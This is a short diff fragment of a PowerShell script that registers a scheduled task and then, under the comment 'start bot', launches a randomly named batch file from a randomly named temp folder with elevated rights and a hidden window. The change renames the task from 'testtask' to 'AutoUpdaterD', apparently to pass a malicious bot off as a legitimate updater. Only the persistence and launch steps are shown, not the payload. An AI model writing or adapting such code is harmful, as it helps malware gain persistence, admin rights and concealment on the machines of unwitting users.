@@ -95,7 +95,7 @@ $taskXml = @"
 
 $taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")
 
-Register-ScheduledTask -Xml $taskXml -TaskName 'testtask' -Force
+Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force
 
 #start bot
 cd $env:temp\sVBXKuzqQdnAeJcsBXMnTVKZUniFmN; start-process uesFNz8Ds9KS.cmd -Verb runAs -WindowStyle Hidden
